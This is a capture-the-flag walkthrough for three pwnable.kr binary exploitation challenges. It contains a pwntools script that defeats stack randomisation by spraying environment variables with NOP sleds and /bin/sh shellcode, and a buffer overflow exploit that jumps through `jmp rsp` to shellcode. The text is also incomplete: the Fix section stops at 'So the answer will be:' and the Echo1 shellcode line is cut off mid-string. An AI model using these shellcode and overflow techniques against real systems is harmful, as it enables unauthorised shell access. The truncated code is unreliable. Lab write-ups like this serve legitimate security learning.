
# PwnableWalkthrough

### Tiny Easy - Level 6

Now we have a program which contains just 4 lines of assembly instructions:

```assembly
0x8048054:   pop    eax
0x8048055:   pop    edx
0x8048056:   mov    edx,DWORD PTR [edx]
0x8048058:   call   edx
```
It pops twice, and jumps to where the pointer points to.
Since that at the beginning of each program the os is pushing argv + env to the stack,
the program will call `argv[0]`.
So now we have found a way to jump to any location we want.
The problem in this challenge is that we have some kind of alsr, which randomizes our stack.
So that means we don't have a constant address of where the stack start, so we can't just jump there.
My way of bypassing that is by using brute force.
We fill all of the stack with nops, by adding a lot of environment variables that will be pushed to the stack.
and after that there will be our shellcode.
we can try to run the program a lot of times and jump to an address we decide.
If the address is by any chance in the stack, we will reach our shellcode and get a shell.
A good way to choose the address is by running the program in `gdb`, and looking at where `argv` is.
(it doesn't mean that it will be always that address, but it means that its possible)

Exploit:

```python
from pwn import *

shellCode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80'

path = "tiny_easy"
address = '\x69\x69\xb0\xff'
envv = {str(i):("\x90" * 1000 + shellCode) for i in range(200)}

for i in range(400):

        temp = process(argv=[address], executable=path, env=envv)
        try:
                temp.recvline(timeout=1)
                temp.interactive()
                break
        except Exception as e:
                temp.close()
                print(i, "failed")
                print(e)
```


### Fix - Level 9

We have a simple c program, which simulates buffer overflow with a shellcode from shell-storm.
The only thing we can do is to change 1 byte of the shellcode to whatever we want, in order to make it work.
After debugging the binary, I noticed that all the shellcode gets overwritten after this assembly line:

```assembly
xor    %eax,%eax
push   %eax
push   $0x68732f2f
push   $0x6e69622f
mov    %esp,%ebx
push   %eax -----> this line
push   %ebx
mov    %esp,%ecx
mov    $0xb,%al
int    $0x80

```

This happens because the shellcode is stored in the stack, and the `push` command is writing stuff to the stack, so it overwrites the next commands.
Which means if we will be able to just change `esp` to some random location, we will be able to push to the stack normally without overriding next instructions.
Since we can only change 1 byte of the shellcode, the only 1 byte command we can use is pop.
So to change esp we would have to do `pop esp`, which is `0x5c`
We can for example change one of the pushes, since they are 1 byte aswell.
One thing to notice is that we normally can't do things like `xor esp, esp`, `pop esp`, because esp is a special register.
In order to be able to do it we would have to run the command `ulimit -s unlimited`.
So the answer will be:

### Echo1 - Level 10

We have a program which asks a user for a name, and then a string and it echos the string.
the vulnerability in this program is that when we get input from the user, we can write after the string, since the fgets writes to many characters:
![image](https://user-images.githubusercontent.com/56035342/212696261-e353434b-a8be-4d17-89ca-c401835d1b11.png)
So we can understand that the challenge is some kind of a bufferoverflow.
After doing what we usually do when facing a bufferoverflow vulnerability,
I have found that the return address is stored 40 characters after the string(32 (size of buffer) + 8(ebp))
Another important thing to notice is that when we enter the name, it takes the first 4 bytes and puts it in the variable `id`, which is stored in `0x6020A0`, which means we can control a variable at a location we know, which is a really powerfull thing(spoiler: because we can jmp to that location and run an instruction we want)
In order to exploit those vulnerabilies, I have done the following things:
First of all, I compiled the command `jmp rsp`, which jumps to the value of rsp. it gave me `\xff\xe4`.
We need that specific command, beacause its the exact location of the end of the buffer, where our shellcode is located.
Now we need 40 characters to reach to the return pointer.
Then we need to specify an address which our code will jump to when the `ret` instruction is called.
I entered the address of id(`0x6020A0`) because then it will execute the command I entered, which is `jmp rsp`.
Then I have specified our shellcode, which will execute `/bin/sh` and give us a shell.
The final exploit code is as follows:

```py
from pwn import *

ssh=remote('pwnable.kr',9010)
shellCode = "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x>
jmpRSP = "\xff\xe4"
space = '\x90' * 40
keyAddress = '\xa0\x20\x60\x00\x00\x00\x00\x00'

ssh.sendline(jmpRSP)
ssh.sendline("1")
ssh.sendline(space + keyAddress + shellCode)
ssh.interactive()

```







